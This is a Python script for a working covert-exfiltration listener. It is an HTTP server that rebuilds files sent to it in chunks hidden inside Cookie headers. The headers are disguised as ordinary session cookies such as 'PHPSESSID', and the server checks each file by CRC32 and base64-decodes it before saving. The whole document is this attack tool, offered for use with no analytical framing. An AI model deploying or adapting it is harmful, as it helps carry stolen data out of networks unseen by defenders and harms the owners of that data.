#!/usr/bin/env python3

import http.server
import socketserver
import argparse, logging, sys
import base64
import zlib

FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
# Packet configuration
INIT_PACKET_COOKIE = "sessionID"
PACKET_COOKIE = "PHPSESSID"
TERMINATION_COOKIE = "sessID0"
COOKIE_DELIMITER = ".."
DATA_END = "00000000000000"

CRC = 0
FH = None
FILENAME = ""
TOTAL_PACK = 0
DATA_PACK_RECVD = 0
RECVD_DATA = ""
VALIDATE_DATA = ""

class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def log_message(self, format, *args):
        # Dont show request in Terminal
        pass

    def do_GET(self):
        global FH, CRC, FILENAME, TOTAL_PACK, DATA_PACK_RECVD, RECVD_DATA
        self.cookieHeader = self.headers.get('Cookie')
        http.server.SimpleHTTPRequestHandler.do_GET(self)
        if self.cookieHeader:
            cookie_header = self.cookieHeader.split('=')
            cookie_name = cookie_header[0]
            VALIDATE_DATA = cookie_header[1]

            if cookie_name == INIT_PACKET_COOKIE:
                #viable_data = data[data_init_offset:]             
                info = VALIDATE_DATA.split('..') 
                FILENAME = info[0]      # getting filename
                CRC = info[1]           # Getting CRC
                TOTAL_PACK = info[2] # Getting packet amount
                # Print user friendly information
                logging.info("Got initiation packet from " + str(self.client_address))
                logging.info("Will now initiate capturing of:")
                logging.info("\t\tFilename:\t%s" % FILENAME)
                logging.info("\t\tCRC32:\t\t%s" % CRC)
                logging.info("\t\tTotal Packets:\t%s" % TOTAL_PACK)
                FH = open(f'{FILENAME}_{CRC}', 'wb+')
                RECVD_DATA = ""
    
            # Found regular data
            elif PACKET_COOKIE in cookie_name : 
                RECVD_DATA += VALIDATE_DATA
                DATA_PACK_RECVD += 1
                print(f'[#] Received {DATA_PACK_RECVD} Packages')

            elif cookie_name == TERMINATION_COOKIE:
                logging.info("Termination from: " + str(self.client_address))
                RECVD_DATA = str.encode(RECVD_DATA) 
                if zlib.crc32(RECVD_DATA) == int(CRC): # CRC32 is matched. 
                    # Continuing to decryption and file saving
                    RECVD_DATA = base64.b64decode(RECVD_DATA.decode('ascii')+ "==")
                    FH.write(RECVD_DATA)
                    FH.close()
                    DATA_PACK_RECVD = 0
                    logging.info("File has been created and saved as " + str(FILENAME) + "_" + str(CRC))
                else:
                    print("[!] No CRC match! Will not be writing file.")
                    print(f'Given CRC: {CRC} != Data: {zlib.crc32(RECVD_DATA)}')
                    print("")
            else:
                # Must be regular HTTP request
                pass

def main():
    with socketserver.TCPServer((args.host, args.port), MyHTTPRequestHandler) as httpd:
        try:
            httpd.allow_reuse_address = True
            httpd.allow_reuse_port = True
            print(f'| Start Server at Port: {args.host}:{args.port}')
            httpd.serve_forever()
        except KeyboardInterrupt:
            print('\nClose Server')
            sys.exit(0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = '')
    parser.add_argument('--host', default='127.0.0.1', type=str, help='Server IP')
    parser.add_argument('-p', '--port', default=80, type=int, help='Server Port')
    #parser.add_argument('-l', '--verbos', default=80, type=int, help='Server Port')
    parser.add_argument('-log', '--level', default=20, type=int, help='Set Logging Level')
    args = parser.parse_args()

    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)
    main()